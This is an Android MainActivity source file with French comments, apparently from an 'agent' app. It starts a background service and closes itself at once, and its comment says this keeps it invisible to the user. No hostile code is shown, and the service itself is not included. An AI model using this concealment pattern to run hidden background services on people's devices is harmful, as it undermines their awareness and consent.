package com.bmu.agent;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;

public class MainActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // Démarrer le service en arrière-plan
        Intent serviceIntent = new Intent(this, AgentService.class);
        startForegroundService(serviceIntent);

        // Fermer l'activité immédiatement (invisible pour l'utilisateur)
        finish();
    }
}
